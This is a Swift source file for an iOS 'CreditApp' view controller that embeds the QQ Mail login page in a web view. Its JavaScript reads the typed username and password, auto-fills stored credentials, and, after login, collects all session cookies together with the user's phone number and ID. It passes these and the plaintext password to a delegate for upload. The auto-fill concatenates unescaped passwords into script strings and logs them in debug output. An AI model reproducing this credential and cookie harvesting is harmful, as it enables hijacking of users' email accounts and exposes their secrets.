//
//  WebLoginQQViewController.swift
//  CreditApp
//
//  Created by 胡骏 on 2018/9/4.
//  Copyright © 2018年 hujuun. All rights reserved.
//

import UIKit

import XCGLogger
import Alamofire
import SwiftyJSON


protocol WebLoginViewControllerDelegate: class {
    func WebLoginViewControllerFindCookies(_ vc: UIViewController, cookies: [String: Any], mail: String, password: String, address: String, inputAccount: String)
}


class WebLoginQQViewController: UIViewController {

    weak var delegate: WebLoginViewControllerDelegate?

    var webView: UIWebView = UIWebView()
    var logg = XCGLogger.default
    
    var upDict: [String: Any] = [String: Any]()
    var userMail = ""
    private var isLogin = false

    private let loadingView = LoadingView()
    
    // MARK: - life cycle
   
    override func viewDidLoad() {
        super.viewDidLoad()
        
        view.addSubview(loadingView)
        loadingView.snp.makeConstraints { (make) in
            make.center.equalTo(view.center)
            make.size.equalTo(CGSize(width: 32, height: 32))
        }
        
        webView.isHidden = true
        webView.backgroundColor = .clear
        webView.delegate = self
        webView.frame = CGRect(x: 0, y: 0, width: kWidth, height: kHight)
        view.addSubview(webView)
        let url = URL(string: "https://ui.ptlogin2.qq.com/cgi-bin/login?style=9&appid=522005705&daid=4&s_url=https%3A%2F%2Fw.mail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwsk%26delegate_url%3D%26f%3Dxhtml%26target%3D&hln_css=http%3A%2F%2Fmail.qq.com%2Fzh_CN%2Fhtmledition%2Fimages%2Flogo%2Fqqmail%2Fqqmail_logo_default_200h.png&low_login=1&hln_autologin=%E8%AE%B0%E4%BD%8F%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81&pt_no_onekey=1")
        webView.loadRequest(URLRequest(url: url!))
    }

    // MARK: - public methods
    fileprivate var autoMailModel: MailModel?
    fileprivate var isAutoUpdate = false
    func viewWithAutoLoad(mailModel: MailModel) {
        isAutoUpdate = true
        autoMailModel = mailModel
    }
    
    // MARK: - notification、closume、event response
    // MARK: - private methods
    fileprivate var inputAccount = ""
    fileprivate var mailPass = ""
    
    fileprivate func getWebUserPassword(_ web: UIWebView) {
        let userjs = "document.getElementsByName('u')[0].value;"
        let passwordjs = "document.getElementsByName('p')[0].value;"
        let user = web.stringByEvaluatingJavaScript(from: userjs)
        let pas = web.stringByEvaluatingJavaScript(from: passwordjs)
        if let u = user, let p = pas, u.count > 0, p.count > 0 {
            inputAccount = u
            mailPass = p
        }
    }
    
    fileprivate func inputUserPassword(_ web: UIWebView, model: MailModel) {
        let mailstring = model.inputAccount
        let passwordstring = model.password
       
        let userjs = "document.getElementsByName('u')[0].value='" + mailstring + "';"
        
        let passwordjs = "document.getElementsByName('p')[0].value='" + passwordstring + "';"
        logg.debug(userjs)
        logg.debug(passwordjs)

        _ = web.stringByEvaluatingJavaScript(from: userjs)
        SwiftTools.timeDelayWithTmer(0.5) {
            _ = web.stringByEvaluatingJavaScript(from: passwordjs)
        }
        let loadjs = "document.getElementById('go').click()"
        SwiftTools.timeDelayWithTmer(1) {
            _ = web.stringByEvaluatingJavaScript(from: loadjs)
        }

    }
    
    fileprivate func savaMail() {
        
    }
    
    deinit {
        print("WebLoginQQViewController gun@@@@@@@")
    }
    
    fileprivate var isFirstLoad = true
    fileprivate var isAutoLoadSuccess = false

}

extension WebLoginQQViewController: UIWebViewDelegate {
    func webViewDidFinishLoad(_ webView: UIWebView) {
        if isFirstLoad {
            isFirstLoad = false
            loadingView.removeFromSuperview()
            webView.isHidden = false
            if isAutoUpdate, let m = autoMailModel {
                self.inputUserPassword(webView, model: m)
                SwiftTools.timeDelayWithTmer(3) {[unowned self] in
                    if self.isAutoLoadSuccess {
                        self.logg.debug("自动登入成功")
                    } else {
                        self.logg.debug("自动登入失败")
                        NotificationCenter.default.post(name: Notification.Name(rawValue: kNotifications.EmailAutoLoadDefaults.rawValue), object: nil, userInfo: [kNotifications.EmailAutoLoadStatus: false])
                    }
                }
            }
        }
    }
    
    func webView(_ webView: UIWebView, shouldStartLoadWith request: URLRequest, navigationType: UIWebView.NavigationType) -> Bool {
        
        if let relativeUrl = request.url?.relativeString {
            let cookies = HTTPCookieStorage.shared.cookies
            guard let cks = cookies else {
                return true
            }
            if cks.count < 20 || isLogin {
                return true
            }
            getWebUserPassword(webView)

            if let cookies = cookies{
                var ca = [[String : Any]]()
                for c in cookies {
                    let domain = c.domain
                    let name = c.name
                    let value = c.value
                    let path = c.path
                    let dict = ["domain": domain, "name": name, "value": value, "path": path, "secure": false] as [String : Any]
                    ca.append(dict)
                    if name == "qqmail_alias" && value.count > 5 {
                        userMail = value
                    }
                }
                if userMail.count < 5 {
                    return true
                }
                isLogin = true

                logg.debug("上传cookie    " + userMail)
                isAutoLoadSuccess = true
                NotificationCenter.default.post(name: Notification.Name(rawValue: kNotifications.EmailAutoLoadDefaults.rawValue), object: nil, userInfo: [kNotifications.EmailAutoLoadStatus: true])

                
                
                let user = UserModel.currentUser

                let resdic = ["userEmail": userMail, "url": relativeUrl, "data": ca, "address": "qq", "userNumber": user.telephone, "userUUID": user.user_uuid!] as [String : Any]
                let manager = AFHTTPSessionManager(sessionConfiguration: URLSessionConfiguration.default)
                manager.requestSerializer = AFJSONRequestSerializer.init()
                upDict = resdic
                if let d = delegate {
                    d.WebLoginViewControllerFindCookies(self, cookies: resdic, mail: userMail, password: mailPass, address: "qq", inputAccount: inputAccount)
                }
            }
        }
        return true
    }
    
}
